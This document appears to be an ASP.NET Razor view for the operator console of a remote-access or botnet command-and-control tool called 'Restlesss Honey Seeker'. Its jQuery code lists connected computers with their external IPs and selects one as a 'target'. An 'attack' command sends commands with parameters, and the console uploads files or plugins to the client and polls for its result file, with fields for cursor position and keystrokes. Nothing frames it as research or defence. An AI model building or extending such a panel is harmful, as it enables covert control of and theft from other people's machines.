@{
    ViewBag.Title = "Restlesss Honey Seeker";
}
<div class="row">
    <div class="col-md-12">
        <div id="containerDiv">...</div>
    </div>
</div>
<div class="row">
    <div class="col-md-12">
        <div class="form-group">
            <label for="computer">Upload</label>
            <form role="form" class="form-inline">
                <select id="uploadType" class="form-control">
                    <option value="@Library.ECommand.DOWNLOAD_FILE">File</option>
                    <option value="@Library.ECommand.UPLOAD_PLUGIN">Plugin</option>
                </select>
                <input id="files" type="file" />
            </form>
        </div>
    </div>
</div>
<div class="row">
    <div class="col-md-12">
        <div class="console"></div>
    </div>
</div>
<script type="text/javascript" src="~/Content/jquery.console.js"></script>
<script type="text/javascript">
    var controller = null;

    $(function () {

        $('input[type="file"]').change(function () {
            //alert("uploading");
            //commands['upload']("file", function (result) {
            //    //alert("OK");
            //});
        });

        var console = $('.console');
        controller = console.console({
            promptLabel: '> ',
            commandValidate: function (line) {
                if (line == "") return false;
                else return true;
            },
            commandHandle: function (line, report) {
                var isDone = false;
                executeCommand(line, function (result) {
                    isDone = true;
                    report(result);
                });
                if (!isDone) {
                    report("");
                    return false;
                }
            },
            animateScroll: true,
            promptHistory: true,
            welcomeMessage: "Type 'help' for a list of commands"
        });
        //controller.promptText('5 * 4');
    });

    function executeCommand(input, onSuccess) {
        var inputSplit = input.split(' ');
        var command = inputSplit.length > 0 ? inputSplit[0] : null;
        var parameters = inputSplit.length > 1 ? inputSplit.slice(1, inputSplit.length) : null;
        if (command && typeof commands[command] === 'function') {
            commands[command](parameters, onSuccess);
        }
    }

    var computers = [],
        currentTarget = null;

    var returnResult = [];

    function getResult() {
        var result = returnResult.slice(0);
        returnResult = [];
        return result;
    }

    function addLine(text, hasMargin) {
        text += hasMargin ? "\t" : "";
        returnResult.push({ msg: text, className: "jquery-console-message-value" });
    }

    var commands = {
        upload: function (parameters, onSuccess) {
            var data = new FormData();
            var files = $("#files").get(0).files;
            var command = '@Library.ECommand.DOWNLOAD_FILE';
            if (files.length > 0) {
                if (parameters.length == 1) {
                    var param1 = ('' + parameters[0]).toLowerCase();
                    switch (param1) {
                        case 'file':
                            command = '@Library.ECommand.DOWNLOAD_FILE';
                            break;
                        case 'plugin':
                            command = '@Library.ECommand.UPLOAD_PLUGIN';
                            break;
                    }
                }
                var fileName = files[0]['name'];
                addLine("Uploading file: " + fileName);
                data.append("UploadedFile", files[0]);
                var req = $.ajax({
                    type: 'POST',
                    url: '/Home/UploadFile',
                    contentType: false,
                    processData: false,
                    data: data
                });
                req.done(function (xhr, status) {
                    if (status == 'success') {
                        addLine("Done uploading!");
                        onSuccess(getResult());
                        //var file = $("#files").val();
                        //alert(file + " - " + files[0]['name']);
                        editSettings(command, fileName, '', 0, 0, "");
                    }
                });
            }
            onSuccess(getResult());
        },
        help: function (parameters, onSuccess) {
            addLine("Available server commands:");
            addLine("help", true);
            addLine("cmd (shows a list of client commands)", true);
            addLine("list (shows a list of clients)", true);
            addLine("clear (clear input)", true);
            addLine("target", true);
            onSuccess(getResult());
        },
        cmd: function (parameters, onSuccess) {
            addLine("Available client commands:");
            $.get('/Home/GetAvailableCommands').done(function (text) {
                var commands = JSON.stringify(text);
                $.each(JSON.parse(commands), function (k, v) {
                    addLine(v, true);
                });
                onSuccess(getResult());
            });
        },
        list: function (parameters, onSuccess) {
            addLine("Available computers:");
            $.getJSON('/Home/GetComputers').done(function (data) {
                computers = [];
                var dataParsed = JSON.parse(data);
                //console.log(computers);
                $.each(dataParsed, function (k, v) {
                    //console.log(v);
                    computers.push({ id: "" + k, val: v });
                    addLine(k + ": " + getComputerDescription(v), true);
                });
                onSuccess(getResult());
            });
        },
        clear: function (parameters, onSuccess) {
            controller.reset();
            addLine("Type 'help' for a list of commands.", "white");
            onSuccess(getResult());
        },
        cls: function (parameters, onSuccess) {
            commands["clear"]();
        },
        attack: function (parameters, onSuccess) {
            if (currentTarget) {
                addLine("Attacking Target: '" + getComputerDescription(currentTarget) + "'.");
                if (parameters && parameters.length >= 1) {
                    var command = parameters[0];
                    var parsArray = parameters.slice(1, parameters.length);
                    var pars = "";
                    for (var i = 0; i < parsArray.length; i++) {
                        pars += parsArray[i] + " ";
                    }
                    pars = pars.trim();
                    addLine("Command: " + command);
                    addLine("Parameters: " + pars);
                    editSettings(command, "", pars, 0, 0, "");
                    getStatus(onSuccess);
                }
                //var command = $('#command').find(':selected').val();
                //var file = $('#FileName').val();
                //var parameters = $('#Parameters').val();
                //editSettings(command, file, parameters, cursorX, cursorY, "");
                //currentTarget = null;
            } else {
                addLine("No target selected... Use 'list' to see a list of computers.");
            }
            onSuccess(getResult());
        },
        target: function (parameters, onSuccess) {
            if (parameters) {
                if (parameters.length == 1) {
                    var param1 = ('' + parameters[0]).toLowerCase();
                    if (param1 == 'remove' || param1 == 'clear') {
                        addLine("Target '" + getComputerDescription(currentTarget) + "' removed.");
                        currentTarget = null;
                    }
                        //else if (param1.substr(0, 4) == 'exec') {

                        //}
                    else {
                        var obj = _.findWhere(computers, { 'id': param1 });
                        if (obj && obj['val']) {
                            currentTarget = obj['val'];
                            addLine("New Target: " + getComputerDescription(currentTarget));
                        }
                    }
                }
                //for (var i = 0; i < parameters.length; i++) {
                //    addLine("Parameters: " + parameters[i]);
                //}
            }
            else {
                if (currentTarget) {
                    addLine("Current Target: " + getComputerDescription(currentTarget));
                }
                else {
                    addLine("No target selected... Use 'list' to see a list of computers.");
                }
            }
            onSuccess(getResult());
        }
    }

    var psChecker;

    function getStatus(onSuccess) {
        addLine("waiting for response (data) from client...");
        onSuccess(getResult());
        psChecker = setInterval(function () {
            $.ajax({
                url: '/api/rhs/getsettings',
                dataType: 'text',
                success: function (text) {
                    var json = JSON.parse(text);
                    //console.log(json['ComputerHash']);
                    if (currentTarget != null) {
                        if (json['ComputerHash'] == null) {
                            clearInterval(psChecker);
                            $("#containerDiv").text("done!");
                            $.ajax({
                                url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=result.txt',
                                dataType: 'text',
                                success: function (result) {
                                    //currentTarget = null;
                                    addLine(result);
                                    onSuccess(getResult());
                                }
                            });
                        }
                        else {
                            $("#containerDiv").text("working...");
                        }
                    }
                }
            });
        }, 500);
    }


    function getComputerDescription(v) {
        if (v) {
            return v['Name'] + " (" + v['IpExternal'] + ")";
        }
        return "No computer selected";
    }

    function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
        console.log(currentTarget);
        if (currentTarget) {
            var data = {
                'ComputerHash': currentTarget['Hash'],
                'Command': command,
                'File': file,
                'Parameters': parameters,
                //'HasExectuted': false,
                'cursorX': cursorX,
                'cursorY': cursorY,
                'keyCode': keyCode
            };
            //alert(data['computerHash']);
            $.post('/api/RHS/SaveSettings', data, function (result) {
                console.log("result: " + result);
                //setTimeout(function () {
                //    $("#data").html("<a target='_blank' href='/Home/GetFile?file=" + fileToOpen + "'>open</a>");
                //}, 7000);
            }, "json");
            //.fail(function (data) {
            //    console.log('failed');
            //});
        }
    }
</script>
<style type="text/css" media="screen">
    div.console {
        font-size: 14px;
        line-height: 20px;
        margin-top: 1em;
        color: #FFF;
        font-family: 'Lucida Console', Consolas, 'Courier New', monospace;
        word-wrap: break-word;
    }

        div.console div.jquery-console-inner {
            width: 98%;
            height: 400px;
            background: #000;
            padding: 0.5em;
            overflow: auto;
        }

        div.console div.jquery-console-prompt-box {
            color: #fff;
            font-family: monospace;
        }

        div.console div.jquery-console-focus span.jquery-console-cursor {
            background: #333;
            color: #eee;
            font-weight: bold;
        }

        div.console div.jquery-console-message-error {
            color: #ef0505;
            font-family: sans-serif;
            font-weight: bold;
            padding: 0.1em;
        }

        div.console div.jquery-console-message-success {
            color: #187718;
            font-family: monospace;
            padding: 0.1em;
        }

        div.console span.jquery-console-prompt-label {
            font-weight: bold;
        }
</style>
<noscript>
    <p>
        <strong>Please enable JavaScript or upgrade your browser.</strong>
    </p>
</noscript>
